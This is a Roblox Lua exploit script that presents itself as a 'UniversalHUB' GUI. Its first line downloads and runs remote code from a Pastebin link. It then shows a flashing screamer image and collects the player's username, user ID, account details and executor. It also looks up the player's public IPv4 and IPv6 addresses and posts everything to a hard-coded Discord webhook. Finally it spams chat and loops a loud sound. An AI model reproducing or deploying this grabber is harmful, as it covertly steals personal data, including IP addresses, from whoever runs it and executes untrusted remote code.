loadstring(game:HttpGet("https://pastebin.com/raw/hE4mYV00"))() 

local G2L = {};

G2L["1"] = Instance.new("ScreenGui", game.CoreGui)
G2L["1"]["SelectionBehaviorLeft"] = Enum.SelectionBehavior.Stop;
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 100;
G2L["1"]["SelectionBehaviorDown"] = Enum.SelectionBehavior.Stop;
G2L["1"]["AutoLocalize"] = false;
G2L["1"]["SelectionBehaviorUp"] = Enum.SelectionBehavior.Stop;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.None;
G2L["1"]["ClipToDeviceSafeArea"] = false;
G2L["1"]["Name"] = [[UniversalHUB]];
G2L["1"]["SelectionBehaviorRight"] = Enum.SelectionBehavior.Stop;
G2L["1"]["ResetOnSpawn"] = false;

G2L["2"] = Instance.new("LocalScript", G2L["1"]);

G2L["3"] = Instance.new("ImageLabel", G2L["1"]);
G2L["3"]["Active"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["Image"] = [[http://www.roblox.com/asset/?id=108597316466514]];
G2L["3"]["Size"] = UDim2.new(1.00103, 0, 1, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["LayoutOrder"] = 6;
G2L["3"]["Name"] = [[Png1]];
G2L["3"]["Position"] = UDim2.new(1.99309, 0, 1.9856, 0);

G2L["4"] = Instance.new("ImageLabel", G2L["1"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["Image"] = [[http://www.roblox.com/asset/?id=88625322735158]];
G2L["4"]["Size"] = UDim2.new(1.00016, 0, 1.0012, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Name"] = [[Png2]];
G2L["4"]["Position"] = UDim2.new(1.99297, 0, 1.9844, 0);

G2L["5"] = Instance.new("Sound", G2L["1"]);
G2L["5"]["Volume"] = 10;
G2L["5"]["Name"] = [[LoadSound]];
G2L["5"]["SoundId"] = [[rbxassetid://103254483938528]];

wait(4)

local LoadSound = G2L["5"]
local Message1 = "I HAS SCREAMED☠👻"
local Webhook = "https://discordapp.com/api/webhooks/1340410769610641408/JhcRkIOqm7E5G-hBJj_wk0KJ0Ft_BhI9Qmpb_ecJnxcJeqXl1tEDXn3t5qy8Ftnd0IbR" -- Put your Webhook link here
local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer
local AccountAge = LocalPlayer.AccountAge -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId -- UserID
local PlayerName = LocalPlayer.Name -- Player name
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId -- The game that player is playing
local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged

function S12()
	G2L["3"].Position = UDim2.fromScale({-0, 0},{-0.001, 0})
	G2L["4"].Position = UDim2.fromScale({-0, 0},{-0.001, 0})
   while wait(0.08) do
	  if G2L["4"].Visible == true then
		   G2L["4"].Visible = false
	  else
		   G2L["4"].Visible = true
	  end
   end
end

function identifyexploit()
	local ieSuccess, ieResult = pcall(identifyexecutor)
	if ieSuccess then return ieResult end

	return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

local PlayerData = {
	["content"] = "",
	["embeds"] = {{

		["author"] = {
			["name"] = "Кто-то словил скример ", -- Grabber name and version
		},

		["title"] = PlayerName, -- Username/PlayerName
		["description"] = "Display Name: "..DisplayName, -- Display Name/Nickname
		["fields"] = {
			{
				--[[Username/PlayerName]]--
				["name"] = "Username:",
				["value"] = PlayerName,
				["inline"] = true
			},
			{
				--[[Membership type]]--
				["name"] = "Membership Type:",
				["value"] = MembershipType,
				["inline"] = true
			},
			{
				--[[Account age]]--
				["name"] = "Account Age (days):",
				["value"] = AccountAge,
				["inline"] = true
			},
			{
				--[[UserID]]--
				["name"] = "UserId:",
				["value"] = UserId,
				["inline"] = true
			},
			{
				--[[IPv4]]--
				["name"] = "IPv4:",
				["value"] = IPv4,
				["inline"] = true
			},
			{
				--[[IPv6]]--
				["name"] = "IPv6:",
				["value"] = IPv6,
				["inline"] = true
			},
			{
				--[[PlaceID]]--
				["name"] = "Place ID: ",
				["value"] = PlaceID,
				["inline"] = true
			},
			{
				--[[Exploit/Executor]]--
				["name"] = "Executor: ",
				["value"] = identifyexploit(),
				["inline"] = true
			},
			{
				--[[Log/Grab time]]--
				["name"] = "Log Time:",
				["value"] = LogTime,
				["inline"] = true
			},
		},
	}}
}

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
	HttpRequest = syn.request
else
	HttpRequest = http_request
end

HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})

LoadSound:Play()

local function spam()
    while wait(2) do
	    pcall(function()
		    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(Message1)
	   end)
    end
end

local function PlaySound()
	while wait(1.9) do
		LoadSound:Play()
	end
end

task.spawn(PlaySound)
task.spawn(spam)
task.spawn(S12)

return G2L["1"], require;
